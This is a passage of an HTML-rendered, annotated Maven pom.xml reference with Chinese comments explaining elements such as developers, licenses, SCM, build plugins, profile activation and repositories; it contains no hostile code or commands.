&lt;!--项目当前版本，格式为:主版本.次版本.增量版本-限定版本号--&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;!--项目的名称, Maven产生的文档用--&gt;</span><br><span class="line">    &lt;name&gt;erhuo-maven&lt;/name&gt;</span><br><span class="line">    &lt;!--项目主页的URL, Maven产生的文档用--&gt;</span><br><span class="line">    &lt;url&gt;http://erhuowang.cn&lt;/url&gt;</span><br><span class="line">    &lt;!-- 项目的详细描述, Maven 产生的文档用。  当这个元素能够用HTML格式描述时（例如，CDATA中的文本会被解析器忽略，就可以包含HTML标 签）， 不鼓励使用纯文本描述。如果你需要修改产生的web站点的索引页面，你应该修改你自己的索引页文件，而不是调整这里的文档。--&gt;</span><br><span class="line">    &lt;description&gt;A maven project to study maven.&lt;/description&gt;</span><br><span class="line">    &lt;!--描述了这个项目构建环境中的前提条件。--&gt;</span><br><span class="line"> &lt;prerequisites&gt;</span><br><span class="line">  &lt;!--构建该项目或使用该插件所需要的Maven的最低版本--&gt;</span><br><span class="line">    &lt;maven/&gt;</span><br><span class="line"> &lt;/prerequisites&gt;</span><br><span class="line"> &lt;!--项目名称和URL--&gt;</span><br><span class="line">    &lt;issueManagement&gt;</span><br><span class="line">     &lt;!--项目名字，--&gt;</span><br><span class="line">        &lt;system&gt;erhuowang&lt;/system&gt;</span><br><span class="line">        &lt;!--该项目使用的URL--&gt;</span><br><span class="line">        &lt;url&gt;http://erhuowang.cn&lt;/url&gt;</span><br><span class="line">    &lt;/issueManagement&gt;</span><br><span class="line">    &lt;!--项目持续集成信息--&gt;</span><br><span class="line"> &lt;ciManagement&gt;</span><br><span class="line">  &lt;!--持续集成系统的名字，例如continuum--&gt;</span><br><span class="line">  &lt;system/&gt;</span><br><span class="line">  &lt;!--该项目使用的持续集成系统的URL（如果持续集成系统有web接口的话）。--&gt;</span><br><span class="line">  &lt;url/&gt;</span><br><span class="line">  &lt;!--构建完成时，需要通知的开发者/用户的配置项。包括被通知者信息和通知条件（错误，失败，成功，警告）--&gt;</span><br><span class="line">  &lt;notifiers&gt;</span><br><span class="line">   &lt;!--配置一种方式，当构建中断时，以该方式通知用户/开发者--&gt;</span><br><span class="line">   &lt;notifier&gt;</span><br><span class="line">    &lt;!--传送通知的途径--&gt;</span><br><span class="line">    &lt;type/&gt;</span><br><span class="line">    &lt;!--发生错误时是否通知--&gt;</span><br><span class="line">    &lt;sendOnError/&gt;</span><br><span class="line">    &lt;!--构建失败时是否通知--&gt;</span><br><span class="line">    &lt;sendOnFailure/&gt;</span><br><span class="line">    &lt;!--构建成功时是否通知--&gt;</span><br><span class="line">    &lt;sendOnSuccess/&gt;</span><br><span class="line">    &lt;!--发生警告时是否通知--&gt;</span><br><span class="line">    &lt;sendOnWarning/&gt;</span><br><span class="line">    &lt;!--不赞成使用。通知发送到哪里--&gt;</span><br><span class="line">    &lt;address/&gt;</span><br><span class="line">    &lt;!--扩展配置项--&gt;</span><br><span class="line">    &lt;configuration/&gt;</span><br><span class="line">   &lt;/notifier&gt;</span><br><span class="line">  &lt;/notifiers&gt;</span><br><span class="line"> &lt;/ciManagement&gt;</span><br><span class="line"> &lt;!--项目创建年份，4位数字。当产生版权信息时需要使用这个值。--&gt;</span><br><span class="line">    &lt;inceptionYear/&gt;</span><br><span class="line">    &lt;!--项目相关邮件列表信息--&gt;</span><br><span class="line">    &lt;mailingLists&gt;</span><br><span class="line">     &lt;!--该元素描述了项目相关的所有邮件列表。自动产生的网站引用这些信息。--&gt;</span><br><span class="line">        &lt;mailingList&gt;</span><br><span class="line">         &lt;!--邮件的名称--&gt;</span><br><span class="line">            &lt;name&gt;Demo&lt;/name&gt;</span><br><span class="line">            &lt;!--发送邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建--&gt;</span><br><span class="line">            &lt;post&gt;chaibozhou@163.com&lt;/post&gt;</span><br><span class="line">            &lt;!--订阅邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建--&gt;</span><br><span class="line">            &lt;subscribe&gt;chaibozhou@163.com&lt;/subscribe&gt;</span><br><span class="line">            &lt;!--取消订阅邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建--&gt;</span><br><span class="line">            &lt;unsubscribe&gt;chaibozhou@163.com&lt;/unsubscribe&gt;</span><br><span class="line">            &lt;!--你可以浏览邮件信息的URL--&gt;</span><br><span class="line">            &lt;archive&gt;chaibozhou@163.com&lt;/archive&gt;</span><br><span class="line">        &lt;/mailingList&gt;</span><br><span class="line">    &lt;/mailingLists&gt;</span><br><span class="line">    &lt;!--项目开发者列表--&gt;</span><br><span class="line">    &lt;developers&gt;</span><br><span class="line">     &lt;!--某个项目开发者的信息--&gt;</span><br><span class="line">        &lt;developer&gt;</span><br><span class="line">         &lt;!--SCM里项目开发者的唯一标识符--&gt;</span><br><span class="line">            &lt;id&gt;HELLO WORLD&lt;/id&gt;</span><br><span class="line">            &lt;!--项目开发者的全名--&gt;</span><br><span class="line">            &lt;name&gt;chaimm&lt;/name&gt;</span><br><span class="line">            &lt;!--项目开发者的email--&gt;</span><br><span class="line">            &lt;email&gt;chaibozhou@163.com&lt;/email&gt;</span><br><span class="line">            &lt;!--项目开发者的主页的URL--&gt;</span><br><span class="line">            &lt;url/&gt;</span><br><span class="line">            &lt;!--项目开发者在项目中扮演的角色，角色元素描述了各种角色--&gt;</span><br><span class="line">            &lt;roles&gt;</span><br><span class="line">                &lt;role&gt;Project Manager&lt;/role&gt;</span><br><span class="line">                &lt;role&gt;Architect&lt;/role&gt;</span><br><span class="line">            &lt;/roles&gt;</span><br><span class="line">            &lt;!--项目开发者所属组织--&gt;</span><br><span class="line">            &lt;organization&gt;demo&lt;/organization&gt;</span><br><span class="line">            &lt;!--项目开发者所属组织的URL--&gt;</span><br><span class="line">            &lt;organizationUrl&gt;http://erhuowang.cn&lt;/organizationUrl&gt;</span><br><span class="line">            &lt;!--项目开发者属性，如即时消息如何处理等--&gt;</span><br><span class="line">            &lt;properties&gt;</span><br><span class="line">                &lt;dept&gt;No&lt;/dept&gt;</span><br><span class="line">            &lt;/properties&gt;</span><br><span class="line">            &lt;!--项目开发者所在时区， -11到12范围内的整数。--&gt;</span><br><span class="line">            &lt;timezone&gt;-5&lt;/timezone&gt;</span><br><span class="line">        &lt;/developer&gt;</span><br><span class="line">    &lt;/developers&gt;</span><br><span class="line">    &lt;!--项目的其他贡献者列表--&gt;</span><br><span class="line">    &lt;contributors&gt;</span><br><span class="line">     &lt;!--项目的其他贡献者。参见developers/developer元素--&gt;</span><br><span class="line">     &lt;contributor&gt;</span><br><span class="line">   &lt;name/&gt;&lt;email/&gt;&lt;url/&gt;&lt;organization/&gt;&lt;organizationUrl/&gt;&lt;roles/&gt;&lt;timezone/&gt;&lt;properties/&gt;</span><br><span class="line">     &lt;/contributor&gt;</span><br><span class="line">    &lt;/contributors&gt;</span><br><span class="line">    &lt;!--该元素描述了项目所有License列表。 应该只列出该项目的license列表，不要列出依赖项目的 license列表。如果列出多个license，用户可以选择它们中的一个而不是接受所有license。--&gt;</span><br><span class="line">    &lt;licenses&gt;</span><br><span class="line">     &lt;!--描述了项目的license，用于生成项目的web站点的license页面，其他一些报表和validation也会用到该元素。--&gt;</span><br><span class="line">        &lt;license&gt;</span><br><span class="line">         &lt;!--license用于法律上的名称--&gt;</span><br><span class="line">            &lt;name&gt;Apache 2&lt;/name&gt;</span><br><span class="line">            &lt;!--官方的license正文页面的URL--&gt;</span><br><span class="line">            &lt;url&gt;http://www.baidu.com/erhuwoang/LICENSE-2.0.txt&lt;/url&gt;</span><br><span class="line">            &lt;!--项目分发的主要方式：</span><br><span class="line">              repo，可以从Maven库下载</span><br><span class="line">              manual， 用户必须手动下载和安装依赖--&gt;</span><br><span class="line">            &lt;distribution&gt;repo&lt;/distribution&gt;</span><br><span class="line">            &lt;!--关于license的补充信息--&gt;</span><br><span class="line">            &lt;comments&gt;A business-friendly OSS license&lt;/comments&gt;</span><br><span class="line">        &lt;/license&gt;</span><br><span class="line">    &lt;/licenses&gt;</span><br><span class="line">    &lt;!--SCM(Source Control Management)标签允许你配置你的代码库，供Maven web站点和其它插件使用。--&gt;</span><br><span class="line">    &lt;scm&gt;</span><br><span class="line">        &lt;!--SCM的URL,该URL描述了版本库和如何连接到版本库。欲知详情，请看SCMs提供的URL格式和列表。该连接只读。--&gt;</span><br><span class="line">        &lt;connection&gt;</span><br><span class="line">            scm:svn:http://svn.baidu.com/banseon/maven/banseon/banseon-maven2-trunk(dao-trunk)</span><br><span class="line">        &lt;/connection&gt;</span><br><span class="line">        &lt;!--给开发者使用的，类似connection元素。即该连接不仅仅只读--&gt;</span><br><span class="line">        &lt;developerConnection&gt;</span><br><span class="line">            scm:svn:http://svn.baidu.com/banseon/maven/banseon/dao-trunk</span><br><span class="line">        &lt;/developerConnection&gt;</span><br><span class="line">        &lt;!--当前代码的标签，在开发阶段默认为HEAD--&gt;</span><br><span class="line">        &lt;tag/&gt;</span><br><span class="line">        &lt;!--指向项目的可浏览SCM库（例如ViewVC或者Fisheye）的URL。--&gt;</span><br><span class="line">        &lt;url&gt;http://svn.baidu.com/banseon&lt;/url&gt;</span><br><span class="line">    &lt;/scm&gt;</span><br><span class="line">    &lt;!--描述项目所属组织的各种属性。Maven产生的文档用--&gt;</span><br><span class="line">    &lt;organization&gt;</span><br><span class="line">     &lt;!--组织的全名--&gt;</span><br><span class="line">        &lt;name&gt;demo&lt;/name&gt;</span><br><span class="line">        &lt;!--组织主页的URL--&gt;</span><br><span class="line">        &lt;url&gt;http://www.erhuowang.cn&lt;/url&gt;</span><br><span class="line">    &lt;/organization&gt;</span><br><span class="line">    &lt;!--构建项目需要的信息--&gt;</span><br><span class="line">    &lt;build&gt;</span><br><span class="line">     &lt;!--该元素设置了项目源码目录，当构建项目的时候，构建系统会编译目录里的源码。该路径是相对于pom.xml的相对路径。--&gt;</span><br><span class="line">  &lt;sourceDirectory/&gt;</span><br><span class="line">  &lt;!--该元素设置了项目脚本源码目录，该目录和源码目录不同：绝大多数情况下，该目录下的内容 会被拷贝到输出目录(因为脚本是被解释的，而不是被编译的)。--&gt;</span><br><span class="line">  &lt;scriptSourceDirectory/&gt;</span><br><span class="line">  &lt;!--该元素设置了项目单元测试使用的源码目录，当测试项目的时候，构建系统会编译目录里的源码。该路径是相对于pom.xml的相对路径。--&gt;</span><br><span class="line">  &lt;testSourceDirectory/&gt;</span><br><span class="line">  &lt;!--被编译过的应用程序class文件存放的目录。--&gt;</span><br><span class="line">  &lt;outputDirectory/&gt;</span><br><span class="line">  &lt;!--被编译过的测试class文件存放的目录。--&gt;</span><br><span class="line">  &lt;testOutputDirectory/&gt;</span><br><span class="line">  &lt;!--使用来自该项目的一系列构建扩展--&gt;</span><br><span class="line">  &lt;extensions&gt;</span><br><span class="line">   &lt;!--描述使用到的构建扩展。--&gt;</span><br><span class="line">   &lt;extension&gt;</span><br><span class="line">    &lt;!--构建扩展的groupId--&gt;</span><br><span class="line">    &lt;groupId/&gt;</span><br><span class="line">    &lt;!--构建扩展的artifactId--&gt;</span><br><span class="line">    &lt;artifactId/&gt;</span><br><span class="line">    &lt;!--构建扩展的版本--&gt;</span><br><span class="line">    &lt;version/&gt;</span><br><span class="line">   &lt;/extension&gt;</span><br><span class="line">  &lt;/extensions&gt;</span><br><span class="line">  &lt;!--当项目没有规定目标（Maven2 叫做阶段）时的默认值--&gt;</span><br><span class="line">  &lt;defaultGoal/&gt;</span><br><span class="line">  &lt;!--这个元素描述了项目相关的所有资源路径列表，例如和项目相关的属性文件，这些资源被包含在最终的打包文件里。--&gt;</span><br><span class="line">  &lt;resources&gt;</span><br><span class="line">   &lt;!--这个元素描述了项目相关或测试相关的所有资源路径--&gt;</span><br><span class="line">   &lt;resource&gt;</span><br><span class="line">    &lt;!-- 描述了资源的目标路径。该路径相对target/classes目录（例如$&#123;project.build.outputDirectory&#125;）。举个例 子，如果你想资源在特定的包里(org.apache.maven.messages)，你就必须该元素设置为org/apache/maven /messages。然而，如果你只是想把资源放到源码目录结构里，就不需要该配置。--&gt;</span><br><span class="line">    &lt;targetPath/&gt;</span><br><span class="line">    &lt;!--是否使用参数值代替参数名。参数值取自properties元素或者文件里配置的属性，文件在filters元素里列出。--&gt;</span><br><span class="line">    &lt;filtering/&gt;</span><br><span class="line">    &lt;!--描述存放资源的目录，该路径相对POM路径--&gt;</span><br><span class="line">    &lt;directory/&gt;</span><br><span class="line">    &lt;!--包含的模式列表，例如**/*.xml.--&gt;</span><br><span class="line">    &lt;includes/&gt;</span><br><span class="line">    &lt;!--排除的模式列表，例如**/*.xml--&gt;</span><br><span class="line">    &lt;excludes/&gt;</span><br><span class="line">   &lt;/resource&gt;</span><br><span class="line">  &lt;/resources&gt;</span><br><span class="line">  &lt;!--这个元素描述了单元测试相关的所有资源路径，例如和单元测试相关的属性文件。--&gt;</span><br><span class="line">  &lt;testResources&gt;</span><br><span class="line">   &lt;!--这个元素描述了测试相关的所有资源路径，参见build/resources/resource元素的说明--&gt;</span><br><span class="line">   &lt;testResource&gt;</span><br><span class="line">    &lt;targetPath/&gt;&lt;filtering/&gt;&lt;directory/&gt;&lt;includes/&gt;&lt;excludes/&gt;</span><br><span class="line">   &lt;/testResource&gt;</span><br><span class="line">  &lt;/testResources&gt;</span><br><span class="line">  &lt;!--构建产生的所有文件存放的目录--&gt;</span><br><span class="line">  &lt;directory/&gt;</span><br><span class="line">  &lt;!--产生的构件的文件名，默认值是$&#123;artifactId&#125;-$&#123;version&#125;。--&gt;</span><br><span class="line">  &lt;finalName/&gt;</span><br><span class="line">  &lt;!--当filtering开关打开时，使用到的过滤器属性文件列表--&gt;</span><br><span class="line">  &lt;filters/&gt;</span><br><span class="line">  &lt;!--子项目可以引用的默认插件信息。该插件配置项直到被引用时才会被解析或绑定到生命周期。给定插件的任何本地配置都会覆盖这里的配置--&gt;</span><br><span class="line">  &lt;pluginManagement&gt;</span><br><span class="line">   &lt;!--使用的插件列表 。--&gt;</span><br><span class="line">   &lt;plugins&gt;</span><br><span class="line">    &lt;!--plugin元素包含描述插件所需要的信息。--&gt;</span><br><span class="line">    &lt;plugin&gt;</span><br><span class="line">     &lt;!--插件在仓库里的group ID--&gt;</span><br><span class="line">     &lt;groupId/&gt;</span><br><span class="line">     &lt;!--插件在仓库里的artifact ID--&gt;</span><br><span class="line">     &lt;artifactId/&gt;</span><br><span class="line">     &lt;!--被使用的插件的版本（或版本范围）--&gt;</span><br><span class="line">     &lt;version/&gt;</span><br><span class="line">     &lt;!--是否从该插件下载Maven扩展（例如打包和类型处理器），由于性能原因，只有在真需要下载时，该元素才被设置成enabled。--&gt;</span><br><span class="line">     &lt;extensions/&gt;</span><br><span class="line">     &lt;!--在构建生命周期中执行一组目标的配置。每个目标可能有不同的配置。--&gt;</span><br><span class="line">     &lt;executions&gt;</span><br><span class="line">      &lt;!--execution元素包含了插件执行需要的信息--&gt;</span><br><span class="line">      &lt;execution&gt;</span><br><span class="line">       &lt;!--执行目标的标识符，用于标识构建过程中的目标，或者匹配继承过程中需要合并的执行目标--&gt;</span><br><span class="line">       &lt;id/&gt;</span><br><span class="line">       &lt;!--绑定了目标的构建生命周期阶段，如果省略，目标会被绑定到源数据里配置的默认阶段--&gt;</span><br><span class="line">       &lt;phase/&gt;</span><br><span class="line">       &lt;!--配置的执行目标--&gt;</span><br><span class="line">       &lt;goals/&gt;</span><br><span class="line">       &lt;!--配置是否被传播到子POM--&gt;</span><br><span class="line">       &lt;inherited/&gt;</span><br><span class="line">       &lt;!--作为DOM对象的配置--&gt;</span><br><span class="line">       &lt;configuration/&gt;</span><br><span class="line">      &lt;/execution&gt;</span><br><span class="line">     &lt;/executions&gt;</span><br><span class="line">     &lt;!--项目引入插件所需要的额外依赖--&gt;</span><br><span class="line">     &lt;dependencies&gt;</span><br><span class="line">      &lt;!--参见dependencies/dependency元素--&gt;</span><br><span class="line">      &lt;dependency&gt;</span><br><span class="line">       ......</span><br><span class="line">      &lt;/dependency&gt;</span><br><span class="line">     &lt;/dependencies&gt;</span><br><span class="line">     &lt;!--任何配置是否被传播到子项目--&gt;</span><br><span class="line">     &lt;inherited/&gt;</span><br><span class="line">     &lt;!--作为DOM对象的配置--&gt;</span><br><span class="line">     &lt;configuration/&gt;</span><br><span class="line">    &lt;/plugin&gt;</span><br><span class="line">   &lt;/plugins&gt;</span><br><span class="line">  &lt;/pluginManagement&gt;</span><br><span class="line">  &lt;!--使用的插件列表--&gt;</span><br><span class="line">  &lt;plugins&gt;</span><br><span class="line">   &lt;!--参见build/pluginManagement/plugins/plugin元素--&gt;</span><br><span class="line">   &lt;plugin&gt;</span><br><span class="line">    &lt;groupId/&gt;&lt;artifactId/&gt;&lt;version/&gt;&lt;extensions/&gt;</span><br><span class="line">    &lt;executions&gt;</span><br><span class="line">     &lt;execution&gt;</span><br><span class="line">      &lt;id/&gt;&lt;phase/&gt;&lt;goals/&gt;&lt;inherited/&gt;&lt;configuration/&gt;</span><br><span class="line">     &lt;/execution&gt;</span><br><span class="line">    &lt;/executions&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">     &lt;!--参见dependencies/dependency元素--&gt;</span><br><span class="line">     &lt;dependency&gt;</span><br><span class="line">      ......</span><br><span class="line">     &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">    &lt;goals/&gt;&lt;inherited/&gt;&lt;configuration/&gt;</span><br><span class="line">   &lt;/plugin&gt;</span><br><span class="line">  &lt;/plugins&gt;</span><br><span class="line"> &lt;/build&gt;</span><br><span class="line"> &lt;!--在列的项目构建profile，如果被激活，会修改构建处理--&gt;</span><br><span class="line"> &lt;profiles&gt;</span><br><span class="line">  &lt;!--根据环境参数或命令行参数激活某个构建处理--&gt;</span><br><span class="line">  &lt;profile&gt;</span><br><span class="line">   &lt;!--构建配置的唯一标识符。即用于命令行激活，也用于在继承时合并具有相同标识符的profile。--&gt;</span><br><span class="line">   &lt;id/&gt;</span><br><span class="line">   &lt;!--自动触发profile的条件逻辑。Activation是profile的开启钥匙。profile的力量来自于它</span><br><span class="line">   能够在某些特定的环境中自动使用某些特定的值；这些环境通过activation元素指定。activation元素并不是激活profile的唯一方式。--&gt;</span><br><span class="line">   &lt;activation&gt;</span><br><span class="line">    &lt;!--profile默认是否激活的标志--&gt;</span><br><span class="line">    &lt;activeByDefault/&gt;</span><br><span class="line">    &lt;!--当匹配的jdk被检测到，profile被激活。例如，1.4激活JDK1.4，1.4.0_2，而!1.4激活所有版本不是以1.4开头的JDK。--&gt;</span><br><span class="line">    &lt;jdk/&gt;</span><br><span class="line">    &lt;!--当匹配的操作系统属性被检测到，profile被激活。os元素可以定义一些操作系统相关的属性。--&gt;</span><br><span class="line">    &lt;os&gt;</span><br><span class="line">     &lt;!--激活profile的操作系统的名字--&gt;</span><br><span class="line">     &lt;name&gt;Windows XP&lt;/name&gt;</span><br><span class="line">     &lt;!--激活profile的操作系统所属家族(如 &#x27;windows&#x27;)--&gt;</span><br><span class="line">     &lt;family&gt;Windows&lt;/family&gt;</span><br><span class="line">     &lt;!--激活profile的操作系统体系结构 --&gt;</span><br><span class="line">     &lt;arch&gt;x86&lt;/arch&gt;</span><br><span class="line">     &lt;!--激活profile的操作系统版本--&gt;</span><br><span class="line">     &lt;version&gt;5.1.2600&lt;/version&gt;</span><br><span class="line">    &lt;/os&gt;</span><br><span class="line">    &lt;!--如果Maven检测到某一个属性（其值可以在POM中通过$&#123;名称&#125;引用），其拥有对应的名称和值，Profile就会被激活。如果值</span><br><span class="line">    字段是空的，那么存在属性名称字段就会激活profile，否则按区分大小写方式匹配属性值字段--&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">     &lt;!--激活profile的属性的名称--&gt;</span><br><span class="line">     &lt;name&gt;mavenVersion&lt;/name&gt;</span><br><span class="line">     &lt;!--激活profile的属性的值--&gt;</span><br><span class="line">     &lt;value&gt;2.0.3&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">    &lt;!--提供一个文件名，通过检测该文件的存在或不存在来激活profile。missing检查文件是否存在，如果不存在则激活</span><br><span class="line">    profile。另一方面，exists则会检查文件是否存在，如果存在则激活profile。--&gt;</span><br><span class="line">    &lt;file&gt;</span><br><span class="line">     &lt;!--如果指定的文件存在，则激活profile。--&gt;</span><br><span class="line">     &lt;exists&gt;/usr/local/hudson/hudson-home/jobs/maven-guide-zh-to-production/workspace/&lt;/exists&gt;</span><br><span class="line">     &lt;!--如果指定的文件不存在，则激活profile。--&gt;</span><br><span class="line">     &lt;missing&gt;/usr/local/hudson/hudson-home/jobs/maven-guide-zh-to-production/workspace/&lt;/missing&gt;</span><br><span class="line">    &lt;/file&gt;</span><br><span class="line">   &lt;/activation&gt;</span><br><span class="line">   &lt;!--构建项目所需要的信息。参见build元素--&gt;</span><br><span class="line">   &lt;build&gt;</span><br><span class="line">    &lt;defaultGoal/&gt;</span><br><span class="line">    &lt;resources&gt;</span><br><span class="line">     &lt;resource&gt;</span><br><span class="line">      &lt;targetPath/&gt;&lt;filtering/&gt;&lt;directory/&gt;&lt;includes/&gt;&lt;excludes/&gt;</span><br><span class="line">     &lt;/resource&gt;</span><br><span class="line">    &lt;/resources&gt;</span><br><span class="line">    &lt;testResources&gt;</span><br><span class="line">     &lt;testResource&gt;</span><br><span class="line">      &lt;targetPath/&gt;&lt;filtering/&gt;&lt;directory/&gt;&lt;includes/&gt;&lt;excludes/&gt;</span><br><span class="line">     &lt;/testResource&gt;</span><br><span class="line">    &lt;/testResources&gt;</span><br><span class="line">    &lt;directory/&gt;&lt;finalName/&gt;&lt;filters/&gt;</span><br><span class="line">    &lt;pluginManagement&gt;</span><br><span class="line">     &lt;plugins&gt;</span><br><span class="line">      &lt;!--参见build/pluginManagement/plugins/plugin元素--&gt;</span><br><span class="line">      &lt;plugin&gt;</span><br><span class="line">       &lt;groupId/&gt;&lt;artifactId/&gt;&lt;version/&gt;&lt;extensions/&gt;</span><br><span class="line">       &lt;executions&gt;</span><br><span class="line">        &lt;execution&gt;</span><br><span class="line">         &lt;id/&gt;&lt;phase/&gt;&lt;goals/&gt;&lt;inherited/&gt;&lt;configuration/&gt;</span><br><span class="line">        &lt;/execution&gt;</span><br><span class="line">       &lt;/executions&gt;</span><br><span class="line">       &lt;dependencies&gt;</span><br><span class="line">        &lt;!--参见dependencies/dependency元素--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">         ......</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">       &lt;/dependencies&gt;</span><br><span class="line">       &lt;goals/&gt;&lt;inherited/&gt;&lt;configuration/&gt;</span><br><span class="line">      &lt;/plugin&gt;</span><br><span class="line">     &lt;/plugins&gt;</span><br><span class="line">    &lt;/pluginManagement&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">     &lt;!--参见build/pluginManagement/plugins/plugin元素--&gt;</span><br><span class="line">     &lt;plugin&gt;</span><br><span class="line">      &lt;groupId/&gt;&lt;artifactId/&gt;&lt;version/&gt;&lt;extensions/&gt;</span><br><span class="line">      &lt;executions&gt;</span><br><span class="line">       &lt;execution&gt;</span><br><span class="line">        &lt;id/&gt;&lt;phase/&gt;&lt;goals/&gt;&lt;inherited/&gt;&lt;configuration/&gt;</span><br><span class="line">       &lt;/execution&gt;</span><br><span class="line">      &lt;/executions&gt;</span><br><span class="line">      &lt;dependencies&gt;</span><br><span class="line">       &lt;!--参见dependencies/dependency元素--&gt;</span><br><span class="line">       &lt;dependency&gt;</span><br><span class="line">        ......</span><br><span class="line">       &lt;/dependency&gt;</span><br><span class="line">      &lt;/dependencies&gt;</span><br><span class="line">      &lt;goals/&gt;&lt;inherited/&gt;&lt;configuration/&gt;</span><br><span class="line">     &lt;/plugin&gt;</span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line">   &lt;/build&gt;</span><br><span class="line">   &lt;!--模块（有时称作子项目） 被构建成项目的一部分。列出的每个模块元素是指向该模块的目录的相对路径--&gt;</span><br><span class="line">   &lt;modules/&gt;</span><br><span class="line">   &lt;!--发现依赖和扩展的远程仓库列表。--&gt;</span><br><span class="line">   &lt;repositories&gt;</span><br><span class="line">    &lt;!--参见repositories/repository元素--&gt;</span><br><span class="line">    &lt;repository&gt;</span><br><span class="line">     &lt;releases&gt;</span><br><span class="line">      &lt;enabled/&gt;&lt;updatePolicy/&gt;&lt;checksumPolicy/&gt;</span><br><span class="line">     &lt;/releases&gt;</span><br><span class="line">     &lt;snapshots&gt;</span><br><span class="line">      &lt;enabled/&gt;&lt;updatePolicy/&gt;&lt;checksumPolicy/&gt;</span><br><span class="line">     &lt;/snapshots&gt;</span><br><span class="line">     &lt;id/&gt;&lt;name/&gt;&lt;url/&gt;&lt;layout/&gt;</span><br><span class="line">    &lt;/repository&gt;</span><br><span class="line">   &lt;/repositories&gt;</span><br><span class="line">   &lt;!--发现插件的远程仓库列表，这些插件用于构建和报表--&gt;</span><br><span class="line">   &lt;pluginRepositories&gt;</span><br><span class="line">    &lt;!--包含需要连接到远程插件仓库的信息.参见repositories/repository元素--&gt;</span><br><span class="line">    &lt;pluginRepository&gt;</span><br><span class="line">     &lt;releases&gt;</span><br><span class="line">      &lt;enabled/&gt;&lt;updatePolicy/&gt;&lt;checksumPolicy/&gt;</span><br><span class="line">     &lt;/releases&gt;</span><br><span class="line">     &lt;snapshots&gt;</span><br><span class="line">      &lt;enabled/&gt;&lt;updatePolicy/&gt;&lt;checksumPolicy/&gt;</span><br><span class="line">     &lt;/snapshots&gt;</span><br><span class="line">     &lt;id/&gt;&lt;name/&gt;&lt;url/&gt;&lt;layout/&gt;</span><br><span class="line">    &lt;/pluginRepository&gt;</span><br><span class="line">   &lt;/pluginRepositories&gt;</span><br><span class="line">   &lt;!--该元素描述了项目相关的所有依赖。 这些依赖组成了项目构建过程中的一个个环节。它们自动从项目定义的仓库中下载。要获取更多信息，请看项目依赖机制。--&gt;</span><br><span class="line">   &lt;dependencies&gt;</span><br><span class="line">    &lt;!--参见dependencies/dependency元素--&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">     ......</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">   &lt;/dependencies&gt;</span><br><span class="line">   &lt;!--不赞成使用. 现在Maven忽略该元素.--&gt;</span><br><span class="line">   &lt;reports/&gt;</span><br><span class="line">   &lt;!--该元素包括使用报表插件产生报表的规范。当用户执行“mvn site”，这些报表就会运行。 在页面导航栏能看到所有报表的链接。参见reporting元素--&gt;</span><br><span class="line">   &lt;reporting&gt;</span><br><span class="line">    ......</span><br><span class="line">   &lt;/reporting&gt;</span><br><span class="line">   &lt;!--参见dependencyManagement元素--&gt;</span><br><span class="line">   &lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">     &lt;!--参见dependencies/dependency元素--&gt;</span><br><span class="line">     &lt;dependency&gt;</span><br><span class="line">      ......</span><br><span class="line">     &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">   &lt;/dependencyManagement&gt;</span><br><span class="line">   &lt;!--参见distributionManagement元素--&gt;</span><br><span class="line">   &lt;distributionManagement&gt;</span><br><span class="line">    ......</span><br><span class="line">   &lt;/distributionManagement&gt;</span><br><span class="line">   &lt;!--参见properties元素--&gt;</span><br><span class="line">   &lt;properties/&gt;</span><br><span class="line">  &lt;/profile&gt;</span><br><span class="line"> &lt;/profiles&gt;</span><br><span class="line"> &lt;!--模块（有时称作子项目） 被构建成项目的一部分。列出的每个模块元素是指向该模块的目录的相对路径--&gt;</span><br><span class="line"> &lt;modules/&gt;</span><br><span class="line">    &lt;!--发现依赖和扩展的远程仓库列表。--&gt;</span><br><span class="line">    &lt;repositories&gt;</span><br><span class="line">     &lt;!--包含需要连接到远程仓库的信息--&gt;</span><br><span class="line">        &lt;repository&gt;</span><br><span class="line">         &lt;!--如何处理远程仓库里发布版本的下载--&gt;</span><br><span class="line">         &lt;releases&gt;</span><br><span class="line">          &lt;!--true或者false表示该仓库是否为下载某种类型构件（发布版，快照版）开启。 --&gt;</span><br><span class="line">    &lt;enabled/&gt;</span><br><span class="line">    &lt;!--该元素指定更新发生的频率。Maven会比较本地POM和远程POM的时间戳。这里的选项是：always（一直），daily（默认，每日），interval：X（这里X是以分钟为单位的时间间隔），或者never（从不）。--&gt;</span><br><span class="line">    &lt;updatePolicy/&gt;</span><br><span class="line">    &lt;!--当Maven验证构件校验文件失败时该怎么做：ignore（忽略），fail（失败），或者warn（警告）。--&gt;</span><br><span class="line">    &lt;checksumPolicy/&gt;</span><br><span class="line">   &lt;/releases&gt;</span><br><span class="line">   &lt;!-- 如何处理远程仓库里快照版本的下载。有了releases和snapshots这两组配置，POM就可以在每个单独的仓库中，为每种类型的构件采取不同的 策略。例如，可能有人会决定只为开发目的开启对快照版本下载的支持。参见repositories/repository/releases元素 --&gt;</span><br><span class="line">   &lt;snapshots&gt;</span><br><span class="line">    &lt;enabled/&gt;&lt;updatePolicy/&gt;&lt;checksumPolicy/&gt;</span><br><span class="line">   &lt;/snapshots&gt;</span><br><span class="line">   &lt;!--远程仓库唯一标识符。可以用来匹配在settings.xml文件里配置的远程仓库--&gt;</span><br><span class="line">   &lt;id&gt;banseon-repository-proxy&lt;/id&gt;</span><br><span class="line">   &lt;!--远程仓库名称--&gt;</span><br><span class="line">            &lt;name&gt;banseon-repository-proxy&lt;/name&gt;</span><br><span class="line">            &lt;!--远程仓库URL，按protocol://hostname/path形式--&gt;</span><br><span class="line">            